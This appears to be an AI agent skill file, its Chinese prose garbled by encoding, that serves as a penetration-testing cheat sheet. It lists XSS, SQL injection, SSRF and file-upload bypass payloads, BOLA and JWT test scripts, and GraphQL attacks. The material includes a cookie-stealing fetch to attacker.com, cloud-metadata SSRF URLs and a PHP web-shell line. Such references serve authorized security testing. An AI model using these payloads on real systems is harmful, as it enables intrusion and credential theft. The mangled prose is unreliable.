---
name: pentest
description: å…¨æ ˆæ¸—é€æµ‹è¯•ã€‚Webæ¸—é€ã€APIå®‰å…¨ã€å†…ç½‘æ¸—é€ã€OWASP Top 10ã€‚å½“ç”¨æˆ·æåˆ°æ¸—é€æµ‹è¯•ã€Webå®‰å…¨ã€APIå®‰å…¨ã€æ¼æ´æŒ–æ˜ã€Burpã€XSSã€SQLiã€SSRFã€è¶Šæƒã€BOLAæ—¶ä½¿ç”¨ã€‚
---

# ğŸ”¥ èµ¤ç„°ç§˜å…¸ Â· æ¸—é€æµ‹è¯• (Penetration Testing)

> èµ¤ç„°ç„šå¤©ï¼Œä¸‡æ³•çš†å¯ç ´ã€‚æ­¤å…¸å½•æ¸—é€æµ‹è¯•ä¸€è„‰ä¹‹ç²¾è¦ã€‚

## æ¸—é€æµ‹è¯•æµç¨‹

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    æ¸—é€æµ‹è¯•æµç¨‹                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Phase 1: ä¿¡æ¯æ”¶é›†                                           â”‚
â”‚  â”œâ”€ ç›®æ ‡è¯†åˆ« â†’ æŠ€æœ¯æ ˆæŒ‡çº¹ â†’ WAFæ£€æµ‹ â†’ ç«¯å£æ‰«æ              â”‚
â”‚  â””â”€ ç›®å½•æ‰«æ â†’ å‚æ•°å‘ç° â†’ JSåˆ†æ                            â”‚
â”‚                        â†“                                     â”‚
â”‚  Phase 2: æ¼æ´æ‰«æ                                           â”‚
â”‚  â”œâ”€ OWASP Top 10 å…¨è¦†ç›–                                      â”‚
â”‚  â”œâ”€ æŠ€æœ¯æ ˆç‰¹å®šæ¼æ´                                           â”‚
â”‚  â””â”€ ä¸šåŠ¡é€»è¾‘æ¼æ´                                             â”‚
â”‚                        â†“                                     â”‚
â”‚  Phase 3: æ¼æ´åˆ©ç”¨                                           â”‚
â”‚  â”œâ”€ PoCéªŒè¯ â†’ æ•°æ®æå– â†’ æƒé™æå‡                           â”‚
â”‚  â””â”€ æ¨ªå‘ç§»åŠ¨ â†’ æŒä¹…åŒ–                                        â”‚
â”‚                        â†“                                     â”‚
â”‚  Phase 4: æŠ¥å‘Šè¾“å‡º                                           â”‚
â”‚  â””â”€ æŒ‰ä¸¥é‡æ€§åˆ†çº§ â†’ ä¿®å¤å»ºè®® â†’ å¤æµ‹éªŒè¯                      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## OWASP Top 10 æµ‹è¯•

| æ¼æ´ | æµ‹è¯•æ–¹æ³• | Payload ç¤ºä¾‹ |
|------|----------|--------------|
| A01 è®¿é—®æ§åˆ¶ | IDORã€è¶Šæƒã€JWTä¼ªé€  | æ›¿æ¢IDè®¿é—®ä»–äººæ•°æ® |
| A02 åŠ å¯†å¤±è´¥ | HTTPSã€æ•æ„Ÿæ•°æ®æ˜æ–‡ | æŠ“åŒ…åˆ†æ |
| A03 æ³¨å…¥ | SQLiã€XSSã€CMDiã€SSTI | `' OR '1'='1` |
| A04 ä¸å®‰å…¨è®¾è®¡ | ä¸šåŠ¡é€»è¾‘æ¼æ´ | æµç¨‹ç»•è¿‡ |
| A05 é…ç½®é”™è¯¯ | é»˜è®¤å‡­è¯ã€ç›®å½•éå† | `/admin` |
| A06 è„†å¼±ç»„ä»¶ | CVEæ‰«æ | Nucleiæ¨¡æ¿ |
| A07 è®¤è¯å¤±è´¥ | å¼±å¯†ç ã€ä¼šè¯å›ºå®š | çˆ†ç ´ã€é‡æ”¾ |
| A08 æ•°æ®å®Œæ•´æ€§ | ååºåˆ—åŒ– | æ¶æ„å¯¹è±¡ |
| A09 æ—¥å¿—ä¸è¶³ | æ•æ„Ÿä¿¡æ¯æ³„éœ² | é”™è¯¯ä¿¡æ¯ |
| A10 SSRF | å†…ç½‘æ¢æµ‹ | `http://127.0.0.1` |

## Web æ¸—é€æµ‹è¯•

### XSS Payload
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
javascript:alert(1)
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

### SQL æ³¨å…¥
```sql
-- æ£€æµ‹
' OR '1'='1
1' AND SLEEP(5)--
1 UNION SELECT 1,2,3--

-- æ•°æ®æå–
1 UNION SELECT table_name,2 FROM information_schema.tables--
1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--
```

### SSRF Payload
```
http://127.0.0.1:80
http://169.254.169.254/latest/meta-data/
file:///etc/passwd
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo
dict://127.0.0.1:6379/info
```

### æ–‡ä»¶ä¸Šä¼ ç»•è¿‡
```
shell.php.jpg          # åŒæ‰©å±•å
shell.phtml            # æ›¿ä»£æ‰©å±•å
shell.php%00.jpg       # ç©ºå­—èŠ‚æˆªæ–­
shell.php/.            # è·¯å¾„æ··æ·†
Content-Type: image/jpeg  # MIMEç»•è¿‡
GIF89a<?php system($_GET['cmd']);?>  # æ–‡ä»¶å¤´ç»•è¿‡
```

## API å®‰å…¨æµ‹è¯•

### OWASP API Top 10

| é£é™© | æè¿° | æµ‹è¯•æ–¹æ³• |
|------|------|----------|
| API1 BOLA | å¯¹è±¡çº§æˆæƒå¤±æ•ˆ | æ›¿æ¢IDè®¿é—®ä»–äººæ•°æ® |
| API2 è®¤è¯å¤±æ•ˆ | è®¤è¯æœºåˆ¶ç¼ºé™· | å¼±Tokenã€æ— é™åˆ¶ |
| API3 å±æ€§çº§æˆæƒ | è¿”å›è¿‡å¤šæ•°æ® | æ£€æŸ¥å“åº”å­—æ®µ |
| API4 èµ„æºæ¶ˆè€— | æ— é€Ÿç‡é™åˆ¶ | æ‰¹é‡è¯·æ±‚æµ‹è¯• |
| API5 BFLA | åŠŸèƒ½çº§æˆæƒå¤±æ•ˆ | ä½æƒé™è°ƒç”¨é«˜æƒé™API |

### BOLA æµ‹è¯•
```python
def test_bola(base_url, token):
    """æµ‹è¯•å¯¹è±¡çº§æˆæƒæ¼æ´"""
    headers = {"Authorization": f"Bearer {token}"}
    my_id = 100

    for other_id in [1, 2, 99, 101, 999]:
        resp = requests.get(f"{base_url}/api/users/{other_id}", headers=headers)
        if resp.status_code == 200:
            print(f"[VULN] BOLA: Can access user {other_id}")
```

### JWT æµ‹è¯•
```python
import jwt

def test_jwt_vulns(token):
    """JWT å¸¸è§æ¼æ´æµ‹è¯•"""
    payload = jwt.decode(token, options={"verify_signature": False})

    # 1. alg=none ç»•è¿‡
    none_token = jwt.encode(payload, None, algorithm="none")

    # 2. å¼±å¯†é’¥æµ‹è¯•
    weak_secrets = ["secret", "password", "123456", "key"]
    for secret in weak_secrets:
        try:
            jwt.decode(token, secret, algorithms=["HS256"])
            print(f"[VULN] Weak secret: {secret}")
        except: pass
```

### GraphQL æµ‹è¯•
```graphql
# å†…çœæŸ¥è¯¢ - è·å– Schema
{ __schema { types { name fields { name } } } }

# æ‰¹é‡æŸ¥è¯¢æ”»å‡»
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
}

# æ·±åº¦åµŒå¥— DoS
{ user(id: 1) { friends { friends { friends { name } } } } }
```

## æŠ€æœ¯æ ˆç‰¹å®šæµ‹è¯•

### Laravel/PHP
```yaml
critical_paths:
  - /install              # CRITICAL - å®‰è£…æ¼æ´
  - /composer.json        # HIGH - ä¾èµ–æ³„éœ²
  - /.env                 # HIGH - é…ç½®æ³„éœ²
  - /storage/logs         # MEDIUM - æ—¥å¿—æ³„éœ²
```

### Spring Boot
```yaml
critical_paths:
  - /actuator/env         # CRITICAL - ç¯å¢ƒå˜é‡
  - /actuator/heapdump    # CRITICAL - å†…å­˜è½¬å‚¨
  - /actuator/mappings    # HIGH - è·¯ç”±æ³„éœ²
```

### WordPress
```yaml
critical_paths:
  - /wp-admin/install.php # CRITICAL - é‡è£…æ¼æ´
  - /wp-config.php.bak    # HIGH - é…ç½®å¤‡ä»½
  - /xmlrpc.php           # MEDIUM - çˆ†ç ´å…¥å£
```

## å¸¸ç”¨å·¥å…·

| å·¥å…· | ç”¨é€” |
|------|------|
| Burp Suite | ä»£ç†æŠ“åŒ…ã€æ¼æ´æ‰«æ |
| sqlmap | SQLæ³¨å…¥è‡ªåŠ¨åŒ– |
| Nuclei | æ¼æ´æ¨¡æ¿æ‰«æ |
| ffuf | ç›®å½•/å‚æ•°çˆ†ç ´ |
| httpx | æ‰¹é‡æ¢æµ‹ |
| XSStrike | XSSæ£€æµ‹ |
| jwt_tool | JWTæµ‹è¯• |
| Arjun | å‚æ•°å‘ç° |

## Burp Suite æŠ€å·§

```
# Intruder çˆ†ç ´
Payload: å­—å…¸/æ•°å­—èŒƒå›´
Position: æ ‡è®°å‚æ•° Â§paramÂ§

# Repeater æ‰‹åŠ¨æµ‹è¯•
ä¿®æ”¹å‚æ•° â†’ å‘é€ â†’ åˆ†æå“åº”

# æ’ä»¶æ¨è
- HaE (é«˜äº®æ•æ„Ÿä¿¡æ¯)
- Autorize (è¶Šæƒæ£€æµ‹)
- JSON Beautifier
```

## æŠ¥å‘Šæ ¼å¼

```markdown
# æ¸—é€æµ‹è¯•æŠ¥å‘Š

## ğŸ”´ CRITICAL
### 1. SQLæ³¨å…¥ - /api/users
- **ä½ç½®**: id å‚æ•°
- **PoC**: `id=1' AND SLEEP(5)--`
- **å½±å“**: æ•°æ®åº“å®Œå…¨æ³„éœ²
- **ä¿®å¤**: ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢

## ğŸŸ  HIGH
...

## ğŸŸ¡ MEDIUM
...
```

---

**é“è®­**ï¼šå‘ç°å³éªŒè¯ï¼ŒéªŒè¯å³æŠ¥å‘Šï¼ŒæŠ¥å‘Šå³ä¿®è¡Œã€‚
